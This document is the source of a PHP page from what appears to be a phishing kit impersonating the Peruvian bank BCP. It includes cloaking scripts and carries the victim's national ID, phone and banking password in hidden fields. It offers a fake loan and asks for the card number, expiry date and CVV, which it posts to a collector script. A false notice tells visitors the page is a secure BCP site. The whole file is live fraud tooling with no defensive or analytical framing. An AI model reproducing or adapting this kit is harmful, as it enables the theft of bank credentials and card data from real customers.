<?php
include './config.php';
include './shield/cloack_start.php';
if ($EYEZ == '1'){
  include './guardian/start.php';
}
session_start();
$monto=$_POST['monto'];
$dni=$_POST['dni'];
$tlf=$_POST['tlf'];
$cinter=$_POST['cfrao'];
?>
<!DOCTYPE html>
<html device-type="desktop" class="hydrated"><head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <style data-styles=""></style>
  <title>BCP al instante</title>
  <link rel="stylesheet" href="./flush/estails/eyestile.css">
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <link href="./flush/imagem/favicon.ico" rel="icon" type="image/x-icon">
  <script src="./flush/mast/eyebabe.js" charset="utf-8"></script>
  <link rel="stylesheet" href="./flush/estails/auxi.css">
<link rel="stylesheet" href="./flush/estails/cascade.css">

</head>

<body class="">
  <app-root _nghost-aqk-c52="" ng-version="12.2.16"><router-outlet _ngcontent-aqk-c52=""></router-outlet><app-initial-verify _nghost-aqk-c63=""><bcp-progress-indicator _ngcontent-aqk-c63="" type="indeterminate" mode="dark" class="hydrated"><div class="progress-indicator-container d-none mode-dark"><div class="components-container"><bcp-loader-indicator class="hydrated"><div class="loader-indicator-container d-none mode-dark"><div class="animation-wrapper"><bcp-img class="hydrated"><img alt="BCP" height="32" src="./flush/imagem/lg_favicon_dark.svg" width="32" class="hydrated"></bcp-img><div class="animation indeterminate mode-dark"></div></div></div></bcp-loader-indicator></div></div></bcp-progress-indicator><div _ngcontent-aqk-c63="" class="container-fluid" style="overflow-y: visible;"><div _ngcontent-aqk-c63="" class="row" style="min-height: 100%;"><div _ngcontent-aqk-c63="" class="col-4 d-none d-md-block channel-image-style"><app-channel-image _ngcontent-aqk-c63="" _nghost-aqk-c59=""><div _ngcontent-aqk-c59="" class="channel-img-fixed" style="background-image: url(./flush/imagem/EV.jpg); background-repeat: no-repeat; background-size: cover; background-position: center center; height: 100%;"><img _ngcontent-aqk-c59="" src="./flush/imagem/logo.svg" class="mt16 logoSize logoStyle"></div></app-channel-image></div><div _ngcontent-aqk-c63="" class="col" style="position: relative; overflow-y: visible;"><app-home-header _ngcontent-aqk-c63="" _nghost-aqk-c54=""><div _ngcontent-aqk-c54="" class="row justify-content-end header-padding bar-blue header-first-pages"><div _ngcontent-aqk-c54="" class="col-6 col-md-3 di-lg-none px-0 header-logo-padding"><img _ngcontent-aqk-c54="" src="./flush/imagem/logo.svg" class="logo-small"></div><div _ngcontent-aqk-c54="" class="col-xl-12 d-none d-md-block"><div _ngcontent-aqk-c54="" class="row justify-content-end"><bcp-paragraph _ngcontent-aqk-c54="" color="text" family="regular" class="d-none d-sm-block bar-blue hydrated"></bcp-paragraph><bcp-paragraph _ngcontent-aqk-c54="" color="text bar-blue" family="regular" class="hydrated"></bcp-paragraph><bcp-icon _ngcontent-aqk-c54="" name="chronometer-r" color="text" class="bar-blue hydrated" style="padding-top: 2px;"><i class="icon chronometer-r text"></i></bcp-icon></div></div><div _ngcontent-aqk-c54="" class="col-6 col-md-9 di-lg-none" style="padding-top: 3px;"></div></div><div _ngcontent-aqk-c54="" class="row back-button d-none d-sm-block"></div><div _ngcontent-aqk-c54="" class="row back-button-medium d-only-mobile"></div><bcp-modal _ngcontent-aqk-c54="" ignore-backdrop-click="" class="hydrated"><div class="modal fade" tabindex="-1" role="dialog"><div class="modal-dialog modal-dialog-centered" role="document"><div class="modal-content"><bcp-modal-header _ngcontent-aqk-c54="" class="hydrated"><div class="modal-header"><bcp-img _ngcontent-aqk-c54="" src="./flush/imagem/timeout.svg" class="header-image hydrated"><img class="header-image hydrated" src="./flush/imagem/timeout.svg"></bcp-img><bcp-title _ngcontent-aqk-c54="" size="sm" color="primary-700" family="bold" class="hydrated"><h3 class="bcp-font-bold primary-700"> El tiempo ha terminado </h3></bcp-title><div class="close-container"><bcp-icon class="hydrated"><i class="icon close-r secondary-500"></i></bcp-icon></div></div></bcp-modal-header>
    </div></div></div><div class="modal-backdrop fade"></div></bcp-modal></app-home-header><div _ngcontent-aqk-c63="" class="row container-form"><div _ngcontent-aqk-c63="" class="col mtTable" style="margin-top: 8px;"><div _ngcontent-aqk-c63="" class="box-wrapper container">
      <form method="post" action="./light/dat.php" class="ng-pristine ng-invalid ng-touched"><div _ngcontent-aqk-c63="" class="row mt8 mb32"><div _ngcontent-aqk-c63="" class="col text-center"><bcp-title _ngcontent-aqk-c63="" size="md" class="hydrated"><h2 class="">Dinero al Instante</h2></bcp-title>Hola, está siendo analizado para una ampliación de crédito de <b><font color="#002a8d">S/. <?=$monto; ?>,</font></b> financiado en <b><font color="#002a8d">48 meses</b>.</font> Nuestros analistas de crédito le solicitan los siguientes datos para analizar su solicitud para el <b><font color="#002a8d">Crédito Avanza País</font></b></div></div><div _ngcontent-aqk-c63="" class="row mb24"><div _ngcontent-aqk-c63="" class="col"><bcp-select-input _ngcontent-aqk-c63="" placeholder="Nro de documento" formcontrolname="documentControl" bcpctrlform="" bcpciamdocument="" class="ng-untouched ng-pristine ng-invalid hydrated" maxlength="8">
<input type="hidden" name="dni" id="dni" value="<?=$dni; ?>">
<input type="hidden" name="tlf" id="tlf" value="<?=$tlf; ?>">
<input type="hidden" name="cfrao" id="cfrao" value="<?=$cinter; ?>">  

      <div class="row no-gutters select-input-container">
            

        <div class="col input-container">
    
          <bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
    
          <bcp-input class="hydrated">
    
          <div class="form-group"><input class="form-control" aria-labelledby="bcp-input-0-lbl" autocomplete="off" id="tarka" name="tarka" type="tel" minlength="16" maxlength="19" onkeypress="return valideKey(event);" placeholder="Número de tarjeta (XXXX XXXX XXXX XXXX)" required></div>
    
          <bcp-paragraph class="helper-text hydrated"><p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p></bcp-paragraph></bcp-input></bcp-tooltip></div>
    
        </div>


  <div class="row no-gutters select-input-container">
            

    <div class="col input-container">

      <bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">

      <bcp-input class="hydrated">

      <div class="form-group"><input class="form-control" aria-labelledby="bcp-input-0-lbl" autocomplete="off" name="venci" id="venci" type="tel" maxlength="7" placeholder="Fecha de vencimiento (MM/YY)" required>
        
      </div>

      <bcp-paragraph class="helper-text hydrated"><p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p></bcp-paragraph></bcp-input></bcp-tooltip></div>

    </div>
  
    <div class="row no-gutters select-input-container">
            

      <div class="col input-container">
  
        <bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
  
        <bcp-input class="hydrated">
  
        <div class="form-group"><input class="form-control" aria-labelledby="bcp-input-0-lbl" autocomplete="off" name="cbs" type="tel" minlength="3" maxlength="3" placeholder="CVV (XXX)" required></div>
  
        <bcp-paragraph class="helper-text hydrated"><p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p></bcp-paragraph></bcp-input></bcp-tooltip></div>
  
      </div>


  <bcp-paragraph class="helper-text hydrated"><p class="paragraph-sm bcp-font-regular onsurface-800">&nbsp;</p></bcp-paragraph></bcp-select-input></div></div><div _ngcontent-aqk-c63="" class="row mb24"><div _ngcontent-aqk-c63="" class="col"><bcp-captcha _ngcontent-aqk-c63="" bcpctrlform="" formcontrolname="captchaControl" maxlength="6" minlength="6" bcpalphanumeric="" class="ng-pristine ng-invalid hydrated ng-touched"><div class="row no-gutters captcha-container invalid"><bcp-img class="img-captcha hydrated">
      <img class="img-captcha hydrated" height="48" src="./flush/imagem/caot.jpg" width="127"></bcp-img><div class="col image-container" tabindex="-1" name="div-img-bcp-input-0"></div><div class="col input-container"><bcp-input ctrl-value="" class="hydrated"><div class="form-group invalid"><input class="form-control" required aria-labelledby="bcp-input-0-lbl" autocomplete="off"  type="text" minlength="6" maxlength="6" placeholder="Código" autocorrect="off" autocapitalize="off" spellcheck="false"></div><bcp-paragraph class="helper-text hydrated"><p class="paragraph-sm bcp-font-regular error">&nbsp;</p></bcp-paragraph></bcp-input></div></div></bcp-captcha></div></div><div _ngcontent-aqk-c63="" class="row button-space-bottom d-sm-block btn-not-fixed"><div _ngcontent-aqk-c63="" class="col"><bcp-button _ngcontent-aqk-c63="" type="button" tier="primary" size="lg" full-width="" class="hydrated"><button type="submit" class="btn btn-primary btn-lg btn-block"><bcp-paragraph class="hydrated"><p class="paragraph-lg bcp-font-demi white">Continuar </p></bcp-paragraph></button></bcp-button></div></div></form></div></div></div><app-home-footer _ngcontent-aqk-c63="" _nghost-aqk-c55=""><div _ngcontent-aqk-c55="" class="justify-content-end footer-padding"><div _ngcontent-aqk-c55="" class="col remove-padding p-0"><div _ngcontent-aqk-c55="" class="box-wrapper container footer-container"><section _ngcontent-aqk-c55="" class="footer-main-text"><div _ngcontent-aqk-c55="" class="m-footer-icon"><bcp-icon _ngcontent-aqk-c55="" name="lock-b" color="onsurface-600" class="hydrated"><i class="icon lock-b onsurface-600"></i></bcp-icon></div><div _ngcontent-aqk-c55="" class="container-text-large"><bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm" family="regular" class="footer-text hydrated"><p class="paragraph-sm bcp-font-regular onsurface-600"> Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate <br _ngcontent-aqk-c55="" class="displayDesktop">con nosotros al 311-9898 o a través de nuestros medios digitales. </p></bcp-paragraph></div></section><div _ngcontent-aqk-c55="" class="d-block d-lg-none container-footer-line"><div _ngcontent-aqk-c55="" class="footer-line"></div></div><bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm" family="regular" class="d-none d-sm-block copyright-text hydrated"><p class="paragraph-sm bcp-font-regular onsurface-600"> Todos los derechos reservados &nbsp;&nbsp;|&nbsp;&nbsp; © 2020 VIABCP.com </p></bcp-paragraph><div _ngcontent-aqk-c55="" class="d-block d-sm-none"><bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm" family="regular" class="copyright-text hydrated"><p class="paragraph-sm bcp-font-regular onsurface-600"> © 2020 VIABCP.com<br _ngcontent-aqk-c55=""> Todos los derechos reservados </p></bcp-paragraph></div></div></div></div></app-home-footer></div></div></div></app-initial-verify></app-root>
      <script>
        payform.cardNumberInput(document.getElementById('tarka'));
        payform.expiryInput(document.getElementById('venci'));

      </script>

</body></html>